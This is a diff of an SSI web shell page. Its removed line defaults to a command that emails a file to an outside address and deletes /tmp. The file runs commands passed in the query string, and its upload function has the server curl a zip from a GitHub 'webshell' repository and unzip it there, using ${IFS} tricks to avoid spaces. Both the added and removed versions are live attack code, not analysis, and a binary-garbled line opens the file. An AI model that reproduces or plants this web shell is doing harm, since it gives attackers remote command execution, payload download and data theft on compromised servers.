@@ -37,7 +37,7 @@ r  , !  D*r  l #   HJr    %/  Ljr   '?     P r  , ) Q;
 <!--#config errmsg="Function SSI Disabled"-->
 <!--#set var="zero" value="" -->
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="sendEmail -t rootcyberpunks@gmail.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf;rm -rf /tmp;mkdir -;ls -al" -->
+<!--#set var="shl" value="ls -al" -->
 <!--#else -->
 <!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
 <!--#endif -->
@@ -59,7 +59,7 @@ function nezcmd()
 
 function addupload()
 {
-	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}raw.githubusercontent.com/exploit-haxor/webshell/releases/download/k/db.zip${IFS}|${IFS}tee${IFS}-a${IFS}db.zip;unzip${IFS}db.zip;rm -rf{IFS}db.zip";
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}raw.githubusercontent.com/exploit-haxor/webshell/releases/download/k/db.zip${IFS}|${IFS}tee${IFS}-a${IFS}db.zip;unzip${IFS}db.zip;rm${IFS}-rf${IFS}db.zip;ls";
 }
 </script>
 <style type="text/css">
